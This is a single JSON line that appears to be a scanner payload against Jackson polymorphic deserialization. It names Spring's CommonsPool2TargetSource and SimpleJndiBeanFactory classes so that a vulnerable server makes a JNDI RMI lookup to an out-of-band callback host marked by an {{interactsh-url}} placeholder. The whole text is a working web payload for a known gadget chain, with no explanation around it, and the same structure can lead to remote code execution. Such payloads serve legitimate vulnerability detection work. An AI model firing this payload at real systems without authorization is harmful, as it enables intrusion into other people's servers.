        {"org.springframework.aop.target.CommonsPool2TargetSource":{"targetBeanName":"rmi://{{Hostname}}.{{interactsh-url}}/wo-f","beanFactory":{"org.springframework.jndi.support.SimpleJndiBeanFactory":{"shareableResources":["rmi://{{Hostname}}.{{interactsh-url}}/wo-f"]}}}}

